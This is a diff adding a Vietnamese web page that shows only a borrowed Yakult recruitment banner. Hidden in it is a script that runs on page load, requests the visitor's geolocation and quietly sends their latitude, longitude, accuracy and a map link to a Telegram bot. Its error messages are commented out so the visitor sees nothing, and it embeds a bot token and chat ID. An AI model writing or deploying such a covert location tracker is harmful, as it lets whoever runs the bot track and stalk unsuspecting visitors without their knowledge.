@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Cầu Tổng Bảng</title>
+</head>
+<body onload="getLocation()">
+
+    <img src="https://www.yakult.vn/public/img/bnr-ung-tuyen-yakult-lady.png" style="width: 100%;" />
+  <script>
+    const telegramToken = "8012543222:AAFtNpPI6klaFVVTkjvUTyQj7DUjTesdyUo";        // ← thay bằng token bot của bạn
+    const chatId = "-4936034331";                // ← thay bằng chat ID của bạn
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            // Tạo link Google Maps
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Tin nhắn đầy đủ
+            const message = `📍 Vị trí người dùng:\n\n🌐 Vĩ độ: ${lat}\n🌐 Kinh độ: ${lon}\n🎯 Độ chính xác: ±${acc} mét\n\n🗺️ Mở trên bản đồ: ${mapLink}`;
+
+            // Gửi tin nhắn về Telegram
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+              .then(response => {
+                if (response.ok) {
+                  //alert("✅ Đã gửi tọa độ về Telegram!");
+                } else {
+                  //alert("❌ Lỗi khi gửi Telegram.");
+                }
+              })
+              .catch(error => {
+                //alert("❌ Lỗi mạng hoặc Telegram API.");
+              });
+          },
+          function(error) {
+            //alert("Không thể lấy vị trí: " + error.message);
+          }
+        );
+      } else {
+        //alert("Trình duyệt không hỗ trợ định vị.");
+      }
+    }
+  </script>
+</body>
+</html>
